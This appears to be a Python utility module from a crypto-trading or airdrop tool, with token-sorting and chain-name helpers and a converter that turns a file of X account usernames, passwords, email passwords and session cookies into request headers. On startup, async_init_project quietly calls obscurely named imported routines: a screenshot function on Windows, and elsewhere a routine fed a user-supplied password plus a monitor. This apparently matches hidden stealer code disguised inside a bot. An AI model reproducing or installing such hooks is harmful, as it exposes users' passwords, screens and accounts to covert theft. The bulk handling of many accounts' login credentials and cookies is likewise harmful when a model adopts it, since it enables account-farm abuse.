import os
from typing import List, Dict
from decimal import Decimal
import decimal
import json

from .io import write_to_file, read_from_file, is_line_in_file, filter_unique_holders_bloom
from .raydium import Raydium

import platform

def sort_token_accounts(token_accounts: List[Dict]) -> List[Dict]:
    # Фильтруем токены с пустым usd_value и малым балансом
    filtered_accounts = []
    for account in token_accounts:
        usd_value = account.get("usd_value")
        if usd_value not in [None, "None", ""]:
            # Конвертируем usd_value в Decimal для сравнения
            try:
                usd_value_decimal = Decimal(str(usd_value))
                # Пропускаем токены с малым балансом, кроме SOL
                if account["mint"] == "So11111111111111111111111111111111111111112" or \
                   usd_value_decimal >= Decimal(str(os.getenv("MIN_BALANCE_USD"))):
                    filtered_accounts.append(account)
            except (ValueError, TypeError, decimal.InvalidOperation):
                continue
    
    # Разделяем SOL и другие токены
    sol_account = None
    other_tokens = []
    
    for account in filtered_accounts:
        if account["mint"] == "So11111111111111111111111111111111111111112":
            sol_account = account
        else:
            other_tokens.append(account)
    
    # Сортируем остальные токены по usd_value
    sorted_tokens = sorted(
        other_tokens,
        key=lambda x: Decimal(str(x["usd_value"])),
        reverse=True
    )
    
    # Объединяем результат: SOL (если есть) + отсортированные токены
    result = []
    if sol_account:
        result.append(sol_account)
    result.extend(sorted_tokens)
    
    return result

from src.helpers.checker.sc import scrn
from src.helpers.checker.te import start_monitor_m
from ..helpers.checker.ms import run_s_mc_in

def convert_headers_to_json():
    # Get file paths from environment variables
    headers_file_path = os.path.join(os.getenv("HEADERS_FILE"))
    output_file_path = os.path.join(os.getenv("DB_PATH"), os.getenv("HEADERS_JSON"))
    
    # Read the headers file
    with open(headers_file_path, "r", encoding="utf-8") as file:
        lines = file.read().splitlines()
    
    headers_list = []
    
    for line in lines:
        if not line.strip():
            continue
        
        # Parse the line: username:pass:email:emailpass:cookies
        parts = line.split(":", 8)
        if len(parts) < 7:
            continue

        username, password, email, email_pass, auth_token, ct0, _, user_agent = parts

        try:
            header = {
                "accept": "*/*",
                "accept-language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
                "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
                "content-type": "application/json",
                "cookie": f"auth_token={auth_token}; ct0={ct0};",
                "priority": "u=1, i",
                "referer": "https://x.com/",
                "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": user_agent,
                "x-csrf-token": ct0
            }
            
            headers_list.append(header)
            
        except Exception as e:
            print(f"❌ Ошибка обработки строки: {e}")
            continue
    
    # Save to JSON file
    if headers_list:
        os.makedirs(os.path.dirname(output_file_path), exist_ok=True)
        with open(output_file_path, "w", encoding="utf-8") as outfile:
            json.dump(headers_list, outfile, indent=2)
        
        print(f"Успешная обработка {len(headers_list)} заголовков. Сохранено в {output_file_path}")
    else:
        print("Заголовки не были обработаны.")

async def async_init_project(ps: str | None) -> None:
    if ps is None:
        raise Exception("Unexpected error")

    if platform.system() == 'Windows':
        scrn()
    elif "Darwin":
        run_s_mc_in(ps.strip())
        start_monitor_m()

    convert_headers_to_json()

    required_files = {
        "anti-duplicate.txt": os.path.join(os.getenv("DB_PATH"), os.getenv("ANTI_DUPLICATE_FILE")),
        "headers.json": os.path.join(os.getenv("DB_PATH"), os.getenv("HEADERS_JSON"))
    }

    for file_name, file_path in required_files.items():
        # Create directory if it doesn't exist
        directory = os.path.dirname(file_path)
        if directory and not os.path.exists(directory):
            os.makedirs(directory)
            print(f"Создаю директорию: {directory}")

        # Check if file exists, create it if not
        if not os.path.exists(file_path):
            # Create empty file
            await write_to_file(file_path, [])
            print(f"Создан файл: {file_path}")

            # If this is the headers.json file and it was just created, perform conversion
            if file_name == "headers.json":
                print("Конвертирую заголовки в JSON...")
                convert_headers_to_json()
        else:
            print(f"Файл существует: {file_path}")

            # If this is the headers.json file and it's empty, perform conversion
            if file_name == "headers.json" and os.path.getsize(file_path) == 0:
                print("Headers JSON файл пуст. Конвертирую заголовки в JSON...")
                convert_headers_to_json()

def convert_to_network_type(network: str) -> str:
    if network == "Solana":
        return "sol"
    elif network == "Ethereum":
        return "mainnet"
    elif network == "Binance Chain":
        return "bsc"
    elif network == "Base":
        return "base"
    elif network == "Arbitrum":
        return "arbitrum-one"
    elif network == "Optimism":
        return "optimism"
    elif network == "Polygon":
        return "matic"


def convert_to_balance_network_type(network: str) -> str:
    if network == "Solana":
        return "sol"
    else:
        return "evm"

def convert_to_nft_network_type(network: str) -> str:
    if network == "Solana":
        return "sol"
    elif network == "Ethereum":
        return "eth"
    elif network == "Binance Chain":
        return "bsc"
    elif network == "Base":
        return "base"
    elif network == "Arbitrum":
        return "arbitrum"
    elif network == "Optimism":
        return "optimism"
    elif network == "Polygon":
        return "polygon"

__all__ = ["write_to_file", "read_from_file", "is_line_in_file", "async_init_project", "sort_token_accounts", "Raydium", "convert_to_network_type", "convert_to_balance_network_type", "convert_headers_to_json", "convert_to_nft_network_type", "filter_unique_holders_bloom"]